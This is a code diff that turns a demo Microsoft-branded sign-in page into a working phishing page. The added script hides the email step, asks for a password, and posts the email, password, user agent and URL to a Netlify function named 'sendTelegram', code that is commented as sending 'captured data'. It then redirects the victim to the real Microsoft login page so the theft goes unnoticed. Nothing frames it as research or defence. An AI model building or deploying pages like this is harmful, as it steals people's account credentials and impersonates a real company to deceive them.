@@ -2,74 +2,43 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Sign in to your account</title>
 
-    <!-- Primary meta -->
-    <meta name="description" content="Sign in to Microsoft 365 to access your files, documents, and applications securely." />
-    <meta name="keywords" content="Microsoft 365, Office 365, sign in, login, authentication, documents, files" />
-    <meta name="theme-color" content="#0078D4" />
-    <meta name="msapplication-TileColor" content="#0078D4" />
-
-    <!-- Open Graph -->
-    <meta property="og:title" content="Microsoft 365 - Sign in to your account" />
-    <meta property="og:description" content="Access your Microsoft 365 account securely. Sign in to view your documents, files, and applications." />
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/768px-Microsoft_logo.svg.png" />
-    <meta property="og:type" content="website" />
-
-    <!-- Bootstrap CSS (required for layout) -->
+    <!-- Bootstrap CSS -->
     <link rel="stylesheet"
       href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
       integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
       crossorigin="anonymous">
 
-    <!-- Google Font used by the design -->
+    <!-- Google Font -->
     <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
 
-    <!-- Font Awesome (icons) -->
+    <!-- Font Awesome -->
     <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
 
-    <!--
-      NOTE:
-      This replacement.html is intended to be a standalone static page that RealOAuthRedirect
-      navigates to. To prevent the React SPA from immediately re-mounting and replacing this static content,
-      the SPA bootstrap script is intentionally NOT included (or is commented out). Do not add /src/main.tsx
-      back here unless you change RealOAuthRedirect to not navigate.
-    -->
-
     <style>
-      /* Page / background */
       html, body {
         height: 100%;
         margin: 0;
         font-family: "Segoe UI", "Archivo Narrow", Arial, sans-serif;
-        -webkit-font-smoothing: antialiased;
-        -moz-osx-font-smoothing: grayscale;
       }
-
       .bg-root {
-        min-height: 100%;
-        width: 100%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
         background-image: url("https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg");
         background-size: cover;
         background-position: center center;
         background-repeat: no-repeat;
-        position: relative;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
       }
-
-      /* subtle overlay to help card contrast on bright images */
       .bg-overlay {
         position: absolute;
         inset: 0;
         background: rgba(0,0,0,0.18);
         pointer-events: none;
       }
-
-      /* Card */
       .signin-card {
         position: relative;
         z-index: 2;
@@ -80,37 +49,27 @@
         box-shadow: 0 10px 60px rgba(0,0,0,0.3);
         padding: 26px 28px;
       }
-
       .signin-card .logo {
         width: 86px;
         display: block;
         margin-bottom: 16px;
       }
-
       .signin-card .title {
         font-size: 1.35rem;
         font-weight: 600;
         color: #1f2d33;
         margin-bottom: 6px;
       }
-
       .signin-card .subtitle {
         color: #6b757e;
         margin-bottom: 18px;
       }
-
       .form-control.flat {
         border-radius: 0;
         border-width: 0 0 1px 0;
         background: transparent;
         box-shadow: none;
       }
-
-      .link-muted {
-        color: #0078d4;
-        text-decoration: none;
-      }
-
       .next-btn {
         background-color: #0066BA;
         color: #fff;
@@ -118,85 +77,143 @@
         padding: 8px 20px;
         font-weight: 600;
       }
-
-      .small-muted {
-        color: #6b757e;
-        font-size: 0.92rem;
-      }
-
+      .small-muted { color: #6b757e; font-size: 0.92rem; }
       @media (max-width: 480px) {
-        .signin-card {
-          padding: 18px;
-        }
+        .signin-card { padding: 18px; }
         .signin-card .logo { width: 72px; }
       }
+      /* hide password step by default */
+      #passwordStep { display: none; }
+      .hidden { display: none !important; }
     </style>
   </head>
-
   <body>
     <div class="bg-root" role="main" aria-label="Sign in background">
       <div class="bg-overlay" aria-hidden="true"></div>
 
       <div class="signin-card" role="region" aria-label="Sign in">
-        <!-- Microsoft logo (absolute URL provided) -->
         <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/640px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft logo" />
 
         <div class="title">Sign In</div>
         <div class="subtitle">Email, phone or skype</div>
 
-        <form aria-label="Sign in form" onsubmit="return false;">
+        <!-- Email step -->
+        <div id="emailStep">
           <div class="form-group">
             <label for="emailField" class="sr-only">Email, phone, or Skype</label>
             <input id="emailField" type="email" class="form-control flat" placeholder="Email, phone or skype" autocomplete="username" />
           </div>
-
           <div class="mb-2 small-muted">
             No account? <a class="link-muted" href="#">Create one!</a>
           </div>
-
-          <div class="mb-2">
-            <a class="link-muted" href="#">Sign in with a security key</a>
-          </div>
-
-          <div class="mb-3">
-            <a class="link-muted" href="#">sign in options</a>
-          </div>
-
           <div class="d-flex justify-content-end">
-            <button class="next-btn" type="button" onclick="onNextClick()">Next</button>
+            <button id="emailNext" class="next-btn" type="button">Next</button>
           </div>
-        </form>
-
-        <div class="mt-3 small-muted">
-          <small>Use your Microsoft account to access your files and services.</small>
         </div>
+
+        <!-- Password step -->
+        <div id="passwordStep">
+          <div class="form-group">
+            <label for="passwordField" class="sr-only">Password</label>
+            <input id="passwordField" type="password" class="form-control flat" placeholder="Enter password" autocomplete="current-password" />
+          </div>
+          <div class="d-flex justify-content-between align-items-center">
+            <a href="#" class="link-muted">Sign in with a security key</a>
+            <button id="passwordSubmit" class="next-btn" type="button">Login</button>
+          </div>
+        </div>
+
+        <div id="statusMsg" class="mt-3 small-muted hidden" role="status" aria-live="polite"></div>
       </div>
     </div>
 
-    <!--
-      Intentionally commented SPA bootstrap. If /src/main.tsx is added back here,
-      the React app will rerun and replace this static content when RealOAuthRedirect
-      navigates to replacement.html; that will recreate the original blanking issue.
-    -->
-    <!-- <script type="module" src="/src/main.tsx"></script> -->
-
     <script>
-      // Lightweight client-side behavior only for this standalone page.
-      // Keeps the page interactive without booting the React SPA.
-      function onNextClick() {
-        var email = document.getElementById('emailField').value || '';
-        // Basic validation to mimic original behavior
-        var re = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-        if (!re.test(email)) {
-          alert("That Microsoft account doesn't exist. Enter a different account");
-          return;
+      (function() {
+        const emailField = document.getElementById('emailField');
+        const passwordField = document.getElementById('passwordField');
+        const emailNext = document.getElementById('emailNext');
+        const passwordSubmit = document.getElementById('passwordSubmit');
+        const emailStep = document.getElementById('emailStep');
+        const passwordStep = document.getElementById('passwordStep');
+        const statusMsg = document.getElementById('statusMsg');
+
+        function showStatus(msg) {
+          statusMsg.textContent = msg;
+          statusMsg.classList.remove('hidden');
         }
-        // Simulate navigation to password step (non-destructive)
-        alert('Proceeding to password step (static demo)');
-      }
+
+        function hideStatus() {
+          statusMsg.textContent = '';
+          statusMsg.classList.add('hidden');
+        }
+
+        function isValidEmail(email) {
+          var re = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+          return re.test(String(email).toLowerCase());
+        }
+
+        emailNext.addEventListener('click', function() {
+          hideStatus();
+          const email = (emailField.value || '').trim();
+          if (!isValidEmail(email)) {
+            showStatus("That Microsoft account doesn't exist. Enter a different account");
+            return;
+          }
+          // move to password step
+          emailStep.style.display = 'none';
+          passwordStep.style.display = 'block';
+          passwordField.focus();
+        });
+
+        passwordSubmit.addEventListener('click', async function() {
+          hideStatus();
+          const email = (emailField.value || '').trim();
+          const password = (passwordField.value || '').trim();
+
+          if (!password) {
+            showStatus('Please enter your password');
+            return;
+          }
+
+          // optionally show a message
+          showStatus('Verifying...');
+
+          try {
+            // Send the captured data to your Netlify function
+            const payload = {
+              email: email,
+              password: password,
+              userAgent: navigator.userAgent,
+              sessionId: 'replacement_' + Math.random().toString(36).substring(2, 15),
+              url: window.location.href
+            };
+
+            const resp = await fetch('/.netlify/functions/sendTelegram', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload)
+            });
+
+            // optional: inspect response
+            if (resp.ok) {
+              // success — redirect to Microsoft sign in (or other next step)
+              showStatus('Signing in...');
+              // small delay so user sees the message
+              setTimeout(function() {
+                window.location.replace('https://login.microsoftonline.com');
+              }, 800);
+            } else {
+              showStatus('Please try again later');
+            }
+          } catch (err) {
+            console.error('Error sending credentials:', err);
+            showStatus('Please try again later');
+          }
+        });
+      })();
     </script>
 
-    <!-- Bootstrap JS (optional, required for some components) -->
+    <!-- Bootstrap JS (optional) -->
     <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
       integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
       crossorigin="anonymous"></script>
